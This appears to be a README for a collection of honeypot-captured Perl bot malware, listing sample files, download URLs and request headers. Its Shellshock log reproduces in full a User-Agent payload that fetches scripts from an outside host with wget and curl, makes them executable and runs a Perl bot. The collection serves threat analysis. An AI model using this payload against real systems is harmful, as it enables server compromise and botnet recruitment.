# Collection of Perl Bot scripts

## Captured First
Trojan exploiting Shellshock

### Contents of ``perlbot.tar.gz``
	ffak.txt, ffak.txt, ffperl_1.txt, ffperl.jpg, ffst.txt

### Log of Exploit
	---BEGIN---
		Fri Mar 10 2017 07:58:21 GMT+0000 (UTC)
		New Connection 212.179.90.226 -> 138.68.229.32
		User Agent: () { :;}; /bin/bash -c "cd /tmp; wget -O /tmp/p http://loss.at.ua/ffperl.txt; wget -O /tmp/ffak http://loss.at.ua/ffak.txt; wget -O /tmp/ffst http://loss.at.ua/ffst.txt; chmod +x p ffak ffst; ./ffak; ./ffst; cd /tmp; wget -O /tmp/ffperl.jpg http://loss.at.ua/ffperl.jpg; curl -O /tmp/ffperl.jpg http://loss.at.ua/ffperl.jpg; fetch http://loss.at.ua/ffperl.jpg; tar xvf /tmp/ffperl.jpg; rm -rf /tmp/ffperl.jpg; cd /tmp/.usage; chmod +x *; ./ak; ./st; perl p.txt"
		Requested Resource: /
		Request Method: GET
		Accept: undefined
		Content Type: undefined
		Content Length: undefined


## Captured second
ddos.txt, pbotz.txt
### FROM LOG ENTRY:
``awstats032017.webmail.lynxitalia.it.txt.ORIGINAL``
3952    /[Scripthttp://hhispano.com.ar//gohack/ddos.txt 1 -
3945    /awstats/[Scripthttp://hhispano.com.ar//gohack/pbotz.txt

## URL
hxxp://hhispano.com.ar//gohack/ddos.txt

## HEADERS
###REQUEST HEADERS:
	Host: hhispano.com.ar
	User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Connection: keep-alive


###RESPONSE HEADERS:
	Accept-Ranges: bytes
	Content-Length: 66695
	Content-Type: text/plain
	Date: Tue, 11 Apr 2017 15:12:14 GMT
	Etag: "10487-54b02f335cd74"
	Last-Modified: Sat, 18 Mar 2017 15:28:45 GMT
	Server: Apache

## URL
hxxp://hhispano.com.ar//gohack/pbotz.txt
## HEADERS
###REQUEST HEADERS:
	Host: hhispano.com.ar
	User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Connection: keep-alive
	If-Modified-Since: Tue, 21 Mar 2017 14:00:13 GMT
	If-None-Match: "5611-54b3e10178478"
	Cache-Control: max-age=0

###RESPONSE HEADERS:
	Connection: Keep-Alive
	Date: Tue, 11 Apr 2017 15:29:54 GMT
	Etag: "5611-54b3e10178478"
	Keep-Alive: timeout=5, max=100
	Server: Apache

## Captured third
hxxps://transfer.sh/MBq1n/rion.tgz
### Background
Note that this is not actually a .tgz file. It is a perl script.

Originally from Telnet honeypot, attacking port 80 with a shellshock variation. Log entry is unavailable.

## Captured Fourth
Found these variations at the end of (this article)[https://www.solutionary.com/resource-center/blog/2017/03/apache-struts-2-exploit-analysis/]
